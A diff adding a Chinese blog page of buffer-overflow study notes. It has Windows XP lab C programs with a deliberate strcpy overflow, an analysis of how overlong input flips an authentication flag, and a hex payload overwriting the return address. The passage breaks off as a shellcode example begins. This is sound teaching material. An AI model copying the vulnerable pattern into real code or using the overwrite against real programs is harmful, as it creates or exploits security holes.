@@ -1,0 +1,230 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析"><title>漏洞利用学习笔记-001-缓冲区溢出</title><link rel=canonical href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="漏洞利用学习笔记-001-缓冲区溢出"><meta property="og:description" content="能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析"><meta property="og:url" content="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"><meta property="og:site_name" content="Misaka的秘密花园"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="栈溢出"><meta property="article:published_time" content="2020-10-18T10:00:00+08:00"><meta property="article:modified_time" content="2020-10-18T10:00:00+08:00"><meta name=twitter:title content="漏洞利用学习笔记-001-缓冲区溢出"><meta name=twitter:description content="能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/zh-cn><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/zh-cn>Misaka的秘密花园</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/zh-cn/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>主页</span></a></li><li><a href=/zh-cn/%E5%BD%92%E6%A1%A3/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>归档</span></a></li><li><a href=/zh-cn/%E6%90%9C%E7%B4%A2/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>搜索</span></a></li><li><a href=/zh-cn/%E9%93%BE%E6%8E%A5/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>链接</span></a></li><li><a href=/zh-cn/%E7%95%99%E8%A8%80%E6%9D%BF/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>留言板</span></a></li><li><a href=/zh-cn/%E5%85%B3%E4%BA%8E/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>关于</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/>English</option><option value=https://blog.moeomu.com/zh-cn/ selected>中文</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>暗色模式</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#pe概念>PE概念</a><ol><li><a href=#pe文件与虚拟内存之间的映射>PE文件与虚拟内存之间的映射</a></li><li><a href=#数据补全填充规则>数据补全填充规则</a></li><li><a href=#函数调用约定>函数调用约定</a></li><li><a href=#缓冲区溢出>缓冲区溢出</a></li></ol></li><li><a href=#shellcode>ShellCode</a><ol><li><a href=#exploitshellcodepayload的分工合作>Exploit/ShellCode(Payload)的分工合作</a></li><li><a href=#实例>实例</a><ol><li><a href=#缓冲区溢出控制程序flag>缓冲区溢出控制程序Flag</a></li><li><a href=#硬编码地址控制程序流程>硬编码地址控制程序流程</a></li><li><a href=#加入攻击载荷shellcode>加入攻击载荷(ShellCode)</a></li></ol></li></ol></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/zh-cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/>漏洞利用</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/>漏洞利用学习笔记-001-缓冲区溢出</a></h2><h3 class=article-subtitle>能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Oct 18, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 3 分钟</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/ class=link>English</a></div></footer></div></header><section class=article-content><blockquote><ul><li>功能性逻辑缺陷(Bug)</li><li>安全性逻辑缺陷(Vulnerability)</li></ul><p><a class=link href=exploit-study-01.zip>点击此处下载本文附代码，可执行程序，shellcode文件</a></p></blockquote><p>本文来源：<a class=link href=/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-001-%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba/>Moeomu的博客</a></p><h2 id=pe概念>PE概念</h2><h3 id=pe文件与虚拟内存之间的映射>PE文件与虚拟内存之间的映射</h3><ul><li>ImageBase：装载基址，对(.EXE)是0x00400000，对(.DLL)是0x10000000</li><li>FileOffset：文件偏移地址</li><li>VirtualAddress：虚拟地址，是映射到内存中的地址</li><li>RelativeVirtualAddress：相对虚拟地址，是虚拟地址VA相对装载基址的偏移量</li></ul><blockquote><p>VA = ImageBase + RVA</p></blockquote><h3 id=数据补全填充规则>数据补全填充规则</h3><ul><li>在磁盘上时，PE文件的每个节(.section)是以0x200字节为单位存放，当节的大小不足0x200时，使用0x0补全，当节的大小超过0x200时，分配下一个0x200大小给此节</li><li>在内存中时，PE文件的每个节(.section)是以0x1000字节为单位存放，规则同上</li></ul><blockquote><p>SectionOffset = RVA - FileOffset<br>FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset</p><p>例如.text节RVA=0x1000，FileOffset=0x400，则SectionOffset=0xC00<br>0x00404141处指令文件偏移为0x00404141-0x00400000-(0x1000-0x400)=0x3541</p></blockquote><h3 id=函数调用约定>函数调用约定</h3><div class=table-wrapper><table><thead><tr><th></th><th>C</th><th>SysCall</th><th>StdCall</th><th>BASIC</th><th>FORTRAN</th><th>PASCAL</th></tr></thead><tbody><tr><td>参数入栈顺序</td><td>右->左</td><td>右->左</td><td>右->左</td><td>左->右</td><td>左->右</td><td>左->右</td></tr><tr><td>恢复栈平衡的位置</td><td>母函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td></tr></tbody></table></div><h3 id=缓冲区溢出>缓冲区溢出</h3><blockquote><p>栈帧相邻，局部变量相邻，若数组越界，则会覆盖局部变量，接着覆盖函数返回地址<br>通过淹没栈帧返回地址值以控制程序流程</p></blockquote><hr><h2 id=shellcode>ShellCode</h2><h3 id=exploitshellcodepayload的分工合作>Exploit/ShellCode(Payload)的分工合作</h3><ul><li>Exploit的作用是精准利用某种漏洞，目标是劫持EIP</li><li>ShellCode将执行恶意/善意代码，是攻击载荷</li><li>ShellCode一般是通用的，Exploit只能针对某个特定的漏洞工作</li></ul><h3 id=实例>实例</h3><p>本例使用简单的密码验证来测试漏洞</p><hr><h4 id=缓冲区溢出控制程序flag>缓冲区溢出控制程序Flag</h4><h5 id=代码expstd0101>代码(ExpStd0101)</h5><blockquote><p>编译环境：Windows XP SP3, Visual C++ 6, Debug<br>实验环境：Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Input Number:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h5 id=分析expstd0101>分析(ExpStd0101)</h5><ul><li><p>简易分析</p><ul><li>当输入99999999时，它的末尾<code>'\0'</code>将第9个字节填充，正好将authenticated的最低位1个字节0x1改为0x0</li><li>这也和strcmp函数有关系，如果<code>str1&lt;str2</code>那authenticated的值-1以反码<code>FFFFFFFF</code>存储，此时即使将低位<code>FF</code>溢出为<code>00</code>也无用，所以并非全部的8位字符都可以绕过验证</li></ul></li><li><p>进一步验证</p><ul><li>当输入8个9时，8字节的buffer填满，覆盖1字节的authenticated空间</li><li>当输入11个9时，8字节的buffer填满，覆盖4字节的authenticated空间，即authenticated被完全覆盖，它被冲刷为<code>0x0039393939</code></li><li>当输入15个9时，8字节的buffer填满，覆盖4字节的authenticated空间，本函数EBP所在空间也被覆盖(内容是父函数EBP)</li><li>当输入19个9时，8字节的buffer填满，覆盖4字节的authenticated空间，覆盖4字节的EBP空间，覆盖4字节的返回地址</li></ul></li><li><p>更进一步验证</p><ul><li>由于键盘无法输入一些不可见字符，所以更换为读取文件验证</li></ul></li></ul><hr><h4 id=硬编码地址控制程序流程>硬编码地址控制程序流程</h4><p>使用FILE来进行文件的读取</p><h5 id=代码expstd0102>代码(ExpStd0102)</h5><blockquote><p>编译环境：Windows XP SP3, Visual C++ 6, Debug<br>实验环境：Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span> <span class=n>fp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;password.txt&#34;</span><span class=p>,</span> <span class=s>&#34;rw+&#34;</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fscanf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h5 id=分析expstd0102>分析(ExpStd0102)</h5><blockquote><p>首先使用已知的地址进行shellcode的编写，此地址不同编译器编译出的结果不同，不同系统加载的地址也不同，所以只能测试时使用</p></blockquote><ul><li>必要信息<ul><li>成功分支地址：<code>0x0040111F</code></li><li>由于内存逆序存放，应该逆序写这些值</li></ul></li><li>十六进制编辑password.txt，如下</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span> <span class=mi>34</span> <span class=mi>33</span> <span class=mi>32</span> <span class=mi>31</span>
+</span></span><span class=line><span class=cl><span class=mf>1F</span> <span class=mi>11</span> <span class=mi>40</span> <span class=mo>00</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>运行程序，此时<ul><li>在栈地址<code>0x0012FB24</code>处存放的事是函数<code>verify_password</code>的返回地址</li><li>此处已经被冲刷为<code>0040111F</code>，而此地址是成功分支地址</li></ul></li><li>使用成功分支地址替代了返回地址，但是由于堆栈不平衡，所以程序显示成功后崩溃</li></ul><hr><h4 id=加入攻击载荷shellcode>加入攻击载荷(ShellCode)</h4><p>加大了buffer的大小用来承载攻击载荷<br>动态加载DLL用于调用API</p><h5 id=代码expstd0103>代码(ExpStd0103)</h5><blockquote><p>编译环境：Windows XP SP3, Visual C++ 6, Debug<br>实验环境：Windows XP SP3</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#define PASSWORD &#34;1234567&#34;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
